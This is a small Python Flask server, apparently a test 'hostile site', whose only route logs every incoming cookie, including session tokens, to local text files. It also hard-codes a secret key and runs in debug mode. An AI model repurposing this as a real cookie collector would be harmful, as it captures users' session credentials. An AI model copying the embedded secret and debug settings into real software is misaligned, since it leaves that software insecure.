import flask
from flask import *

app = flask.Flask(__name__)

app.secret_key = 'ypes79X32BVb1TyMA0qkHxYddzpVz4qrzJLFgs3zHL8'

app.url_map.strict_slashes = False

@app.route('/')
def hostile():
        print(request.cookies) # All cookie delete script from https://stackoverflow.com/a/27374365
        f = open("session_db.txt", "a") # Make sure file exists
        f.close()
        with open("session_db.txt", "r+") as f:
                content = f.read()
        get_session = request.cookies.get("session")
        if get_session not in content:
                with open ("session_db.txt", "a") as f:
                        f.write(get_session + "\n")
        f.close()

        f = open("cookie_db.txt", "a")  # Make sure file exists
        f.close()
        with open("cookie_db.txt", "r") as f:
                content = f.read()
        get_cookie = request.cookies.to_dict()
        get_cookie.pop("session")
        get_cookie = json.dumps(get_cookie)
        if get_cookie not in content:
                with open("cookie_db.txt", "a") as f:
                        f.write(get_cookie + "\n")
        f.close()
        return "HOSTILE"

app.run(debug=True, port=3500)